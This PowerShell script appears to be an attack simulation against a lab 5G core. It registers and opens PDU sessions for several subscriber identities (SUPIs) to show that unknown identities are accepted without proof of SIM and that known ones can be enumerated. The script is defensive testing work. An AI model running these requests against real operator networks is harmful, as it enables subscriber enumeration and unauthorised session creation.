# 04-supi-enumeration.ps1
# Simulation: Register and/or create sessions for multiple SUPIs to see which ones
# are "real" (in UDM) vs unknown (UDM returns ephemeral profile). Also shows that
# any SUPI is accepted for registration and PDU session.
#
# Threat: Identity enumeration; session creation for arbitrary SUPI without proof of SIM.
#
# Usage: $ALB_DNS = "your-alb"; .\04-supi-enumeration.ps1

param(
    [Parameter(Mandatory=$false)]
    [string]$BaseUrl = $env:ALB_DNS
)

if (-not $BaseUrl) { Write-Error "Set `$ALB_DNS or pass -BaseUrl"; exit 1 }
$base = "http://$BaseUrl"

Write-Host "=== Attack 4: SUPI enumeration / arbitrary SUPI ===" -ForegroundColor Yellow

$supis = @(
    "imsi-001010000000001",  # known in UDM
    "imsi-001010000000002",  # known in UDM
    "imsi-001010999999999"   # likely unknown -> UDM generates ephemeral
)

foreach ($supi in $supis) {
    Write-Host "`n--- SUPI: $supi ---"
    try {
        $reg = Invoke-WebRequest -UseBasicParsing -Method POST `
            -Uri "$base/namf-comm/v1/ue-contexts/$supi" `
            -Headers @{"Content-Type"="application/json"; "x-trace-id"="attack-enum"} `
            -Body "{`"supi`":`"$supi`",`"servingNetworkName`":`"5G:mnc001.mcc001.3gppnetwork.org`"}"
        $regJson = $reg.Content | ConvertFrom-Json
        $auth = $regJson.registration_steps | Where-Object { $_.step -eq "authentication" }
        $authResult = if ($auth.detail) { $auth.detail.authResult } else { "N/A (step failed)" }
        Write-Host "  Registration: success; auth result = $authResult"
        # PDU session
        $pdu = Invoke-WebRequest -UseBasicParsing -Method POST `
            -Uri "$base/namf-comm/v1/pdu-sessions/$supi" `
            -Headers @{"Content-Type"="application/json"; "x-trace-id"="attack-enum"} `
            -Body '{}'
        $pduJson = $pdu.Content | ConvertFrom-Json
        $sessId = if ($pduJson.session) { $pduJson.session.sessionId } else { $null }
        Write-Host "  PDU session: $(if ($sessId) { "created, sessionId = $sessId" } else { "failed or no sessionId" })"
    } catch {
        Write-Host "  Error: $_"
    }
}

Write-Host "`nRESULT: All SUPIs accepted; no proof of subscription required." -ForegroundColor Red
